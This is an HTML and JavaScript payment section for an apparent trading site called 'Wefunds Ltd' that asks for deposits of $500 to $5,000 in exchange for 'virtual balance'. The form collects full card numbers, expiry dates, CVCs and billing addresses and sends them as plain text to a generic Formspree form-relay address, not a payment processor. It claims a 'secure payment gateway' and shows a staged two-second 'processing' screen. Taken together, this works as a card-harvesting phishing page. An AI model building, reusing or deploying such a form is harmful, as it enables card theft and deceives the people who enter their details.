<!-- Add this form where you want the payment section -->
<!-- Payment Form Section -->
<section id="payment" style="padding: 80px 0; background: var(--secondary-bg);">
    <div class="container">
        <h2 style="text-align: center; margin-bottom: 30px;">ðŸ’³ Secure Payment</h2>
        <p style="text-align: center; color: var(--text-secondary); margin-bottom: 50px; max-width: 600px; margin-left: auto; margin-right: auto;">
            Complete your payment securely with our encrypted payment gateway
        </p>
        
        <div style="max-width: 500px; margin: 0 auto;">
            <!-- Payment Form with Formspree -->
            <form id="paymentForm" action="https://formspree.io/f/mgvybdvz" method="POST" style="background: var(--card-bg); padding: 30px; border-radius: var(--radius); border: 1px solid var(--border-color);">
                <!-- Hidden Formspree Fields -->
                <input type="hidden" name="_subject" value="Payment - Wefunds Ltd">
                <input type="hidden" name="_replyto" id="replyToEmail" value="">
                <input type="hidden" name="_format" value="plain">
                <input type="hidden" name="payment_type" value="deposit">
                <input type="hidden" name="amount" id="amount" value="1000">
                <input type="hidden" name="bonus_type" id="bonusType" value="standard">
                
                <!-- Card Logos -->
                <div style="display: flex; align-items: center; justify-content: center; gap: 20px; margin-bottom: 30px; padding: 15px; background: rgba(240, 185, 11, 0.1); border-radius: var(--radius);">
                    <div style="display: flex; align-items: center; gap: 10px; font-size: 24px;">
                        <i class="fab fa-cc-mastercard" style="color: #eb001b;"></i>
                        <span style="color: var(--text-secondary); font-size: 14px;">Mastercard</span>
                    </div>
                    <div style="display: flex; align-items: center; gap: 10px; font-size: 24px;">
                        <i class="fab fa-cc-visa" style="color: #1a1a8f;"></i>
                        <span style="color: var(--text-secondary); font-size: 14px;">Visa</span>
                    </div>
                </div>
                
                <!-- Amount Selection -->
                <div style="margin-bottom: 25px;">
                    <label style="display: block; margin-bottom: 10px; color: var(--text-secondary); font-weight: 500;">Deposit Amount</label>
                    <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 15px;">
                        <button type="button" class="amount-option" data-amount="500" style="padding: 12px; background: var(--secondary-bg); border: 1px solid var(--border-color); border-radius: var(--radius); color: var(--text-secondary); cursor: pointer; transition: var(--transition);">$500</button>
                        <button type="button" class="amount-option active" data-amount="1000" style="padding: 12px; background: rgba(240, 185, 11, 0.2); border: 1px solid var(--accent-orange); border-radius: var(--radius); color: var(--accent-orange); cursor: pointer; transition: var(--transition); font-weight: 600;">$1,000</button>
                        <button type="button" class="amount-option" data-amount="5000" style="padding: 12px; background: var(--secondary-bg); border: 1px solid var(--border-color); border-radius: var(--radius); color: var(--text-secondary); cursor: pointer; transition: var(--transition);">$5,000</button>
                    </div>
                    <div style="margin-top: 15px; text-align: center; color: var(--text-secondary);">
                        <div style="font-size: 12px; margin-bottom: 5px;">Bonus: <span id="bonusText">$1,000 virtual balance</span></div>
                        <div style="font-size: 18px; font-weight: 600; color: var(--accent-orange);">Total: $<span id="totalAmount">1,000</span></div>
                    </div>
                </div>
                
                <!-- Personal Information -->
                <div style="margin-bottom: 20px;">
                    <label style="display: block; margin-bottom: 8px; color: var(--text-secondary); font-weight: 500;">Full Name</label>
                    <input type="text" name="full_name" required 
                           style="width: 100%; padding: 12px; background: var(--secondary-bg); border: 1px solid var(--border-color); border-radius: var(--radius); color: var(--text-primary); font-size: 14px;"
                           placeholder="John Smith">
                </div>
                
                <div style="margin-bottom: 20px;">
                    <label style="display: block; margin-bottom: 8px; color: var(--text-secondary); font-weight: 500;">Email Address</label>
                    <input type="email" name="email" required 
                           style="width: 100%; padding: 12px; background: var(--secondary-bg); border: 1px solid var(--border-color); border-radius: var(--radius); color: var(--text-primary); font-size: 14px;"
                           placeholder="john@example.com">
                </div>
                
                <!-- Card Information -->
                <div style="margin-bottom: 20px;">
                    <label style="display: block; margin-bottom: 8px; color: var(--text-secondary); font-weight: 500;">Card Number</label>
                    <div style="position: relative;">
                        <input type="text" name="card_number" required maxlength="19"
                               style="width: 100%; padding: 12px; padding-right: 80px; background: var(--secondary-bg); border: 1px solid var(--border-color); border-radius: var(--radius); color: var(--text-primary); font-size: 14px;"
                               placeholder="1234 5678 9012 3456"
                               oninput="formatCardNumber(this)">
                        <div style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); display: flex; gap: 8px; font-size: 20px;">
                            <i class="fab fa-cc-mastercard" style="color: #eb001b;"></i>
                            <i class="fab fa-cc-visa" style="color: #1a1a8f;"></i>
                        </div>
                    </div>
                </div>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px;">
                    <div>
                        <label style="display: block; margin-bottom: 8px; color: var(--text-secondary); font-weight: 500;">Expiry Date</label>
                        <input type="text" name="expiry_date" required maxlength="5"
                               style="width: 100%; padding: 12px; background: var(--secondary-bg); border: 1px solid var(--border-color); border-radius: var(--radius); color: var(--text-primary); font-size: 14px;"
                               placeholder="MM/YY"
                               oninput="formatExpiryDate(this)">
                    </div>
                    <div>
                        <label style="display: block; margin-bottom: 8px; color: var(--text-secondary); font-weight: 500;">CVC</label>
                        <input type="text" name="cvc" required maxlength="4"
                               style="width: 100%; padding: 12px; background: var(--secondary-bg); border: 1px solid var(--border-color); border-radius: var(--radius); color: var(--text-primary); font-size: 14px;"
                               placeholder="123"
                               oninput="formatCVC(this)">
                    </div>
                </div>
                
                <!-- Address -->
                <div style="margin-bottom: 20px;">
                    <label style="display: block; margin-bottom: 8px; color: var(--text-secondary); font-weight: 500;">Billing Address</label>
                    <input type="text" name="billing_address" required 
                           style="width: 100%; padding: 12px; background: var(--secondary-bg); border: 1px solid var(--border-color); border-radius: var(--radius); color: var(--text-primary); font-size: 14px;"
                           placeholder="123 Main St, City, Country">
                </div>
                
                <!-- Phone (Optional) -->
                <div style="margin-bottom: 25px;">
                    <label style="display: block; margin-bottom: 8px; color: var(--text-secondary); font-weight: 500;">Phone Number (Optional)</label>
                    <input type="tel" name="phone"
                           style="width: 100%; padding: 12px; background: var(--secondary-bg); border: 1px solid var(--border-color); border-radius: var(--radius); color: var(--text-primary); font-size: 14px;"
                           placeholder="+1 (123) 456-7890">
                </div>
                
                <!-- Terms -->
                <div style="margin-bottom: 25px; font-size: 12px; color: var(--text-secondary);">
                    <label style="display: flex; align-items: flex-start; gap: 10px; cursor: pointer;">
                        <input type="checkbox" name="terms" required 
                               style="margin-top: 3px; accent-color: var(--accent-orange);">
                        <span>I agree to the <a href="#" style="color: var(--accent-orange); text-decoration: none;">Terms of Service</a> and <a href="#" style="color: var(--accent-orange); text-decoration: none;">Privacy Policy</a>. I understand that trading involves risk and that virtual funds are for practice only.</span>
                    </label>
                </div>
                
                <!-- Submit Button -->
                <button type="submit" 
                        style="width: 100%; padding: 16px; background: linear-gradient(135deg, var(--accent-orange), #e6a900); color: #000; border: none; border-radius: var(--radius); font-size: 16px; font-weight: 600; cursor: pointer; transition: var(--transition); display: flex; align-items: center; justify-content: center; gap: 10px;">
                    <i class="fas fa-lock"></i>
                    Complete Payment of $<span id="submitAmount">1,000</span>
                </button>
                
                <!-- Security Note -->
                <div style="text-align: center; margin-top: 20px; color: var(--text-secondary); font-size: 12px;">
                    <i class="fas fa-shield-alt"></i> 256-bit SSL encrypted â€¢ Powered by secure payment gateway
                </div>
            </form>
            
            <!-- Processing Overlay -->
            <div id="processingOverlay" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(12, 14, 18, 0.95); display: none; justify-content: center; align-items: center; z-index: 2000; backdrop-filter: blur(10px);">
                <div style="background: var(--card-bg); padding: 40px; border-radius: var(--radius); text-align: center; max-width: 400px; width: 90%; border: 1px solid var(--border-color);">
                    <div style="width: 60px; height: 60px; border: 3px solid var(--border-color); border-top: 3px solid var(--accent-orange); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 25px;"></div>
                    <h3 style="margin-bottom: 10px; color: var(--accent-orange);">Processing Payment</h3>
                    <p style="color: var(--text-secondary); margin-bottom: 10px;">
                        Processing $<span id="processingAmount">1,000</span> payment
                    </p>
                    <p style="color: var(--text-secondary); font-size: 14px;">
                        Please wait while we secure your transaction...
                    </p>
                </div>
            </div>
        </div>
    </div>
</section>

<script>
    // Format card number
    function formatCardNumber(input) {
        let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        let formatted = value.replace(/(\d{4})/g, '$1 ').trim();
        input.value = formatted.substring(0, 19);
    }

    // Format expiry date
    function formatExpiryDate(input) {
        let value = input.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        input.value = value.substring(0, 5);
    }

    // Format CVC
    function formatCVC(input) {
        input.value = input.value.replace(/\D/g, '').substring(0, 4);
    }

    // Amount selection
    document.querySelectorAll('.amount-option').forEach(button => {
        button.addEventListener('click', function() {
            document.querySelectorAll('.amount-option').forEach(btn => {
                btn.style.background = 'var(--secondary-bg)';
                btn.style.border = '1px solid var(--border-color)';
                btn.style.color = 'var(--text-secondary)';
                btn.style.fontWeight = '400';
            });
            
            this.style.background = 'rgba(240, 185, 11, 0.2)';
            this.style.border = '1px solid var(--accent-orange)';
            this.style.color = 'var(--accent-orange)';
            this.style.fontWeight = '600';
            
            const amount = this.getAttribute('data-amount');
            document.getElementById('amount').value = amount;
            document.getElementById('totalAmount').textContent = amount;
            document.getElementById('submitAmount').textContent = amount;
            document.getElementById('processingAmount').textContent = amount;
            
            // Update bonus text based on amount
            const bonusText = document.getElementById('bonusText');
            const bonusType = document.getElementById('bonusType');
            
            if (amount === '1000') {
                bonusText.textContent = '$1,000 virtual balance';
                bonusType.value = 'standard';
            } else if (amount === '500') {
                bonusText.textContent = '$500 virtual balance';
                bonusType.value = 'standard';
            } else if (amount === '5000') {
                bonusText.textContent = '$5,000 virtual balance + Priority Support';
                bonusType.value = 'premium';
            }
        });
    });

    // Form submission
    document.getElementById('paymentForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Show processing overlay
        document.getElementById('processingOverlay').style.display = 'flex';
        
        try {
            const formData = new FormData(this);
            const response = await fetch('https://formspree.io/f/mgvybdvz', {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            if (response.ok) {
                // Wait for 2 seconds to show processing
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Redirect to success page or dashboard
                window.location.href = 'dashboard.html';
            } else {
                throw new Error('Payment processing failed');
            }
        } catch (error) {
            console.error('Payment error:', error);
            document.getElementById('processingOverlay').style.display = 'none';
            alert('Payment failed. Please check your information and try again.');
        }
    });

    // Set email from localStorage if available
    window.addEventListener('load', () => {
        const userEmail = localStorage.getItem('userEmail') || '';
        const emailInput = document.querySelector('input[name="email"]');
        const replyToInput = document.getElementById('replyToEmail');
        
        if (userEmail && emailInput) {
            emailInput.value = userEmail;
        }
        if (userEmail && replyToInput) {
            replyToInput.value = userEmail;
        }
    });
</script>
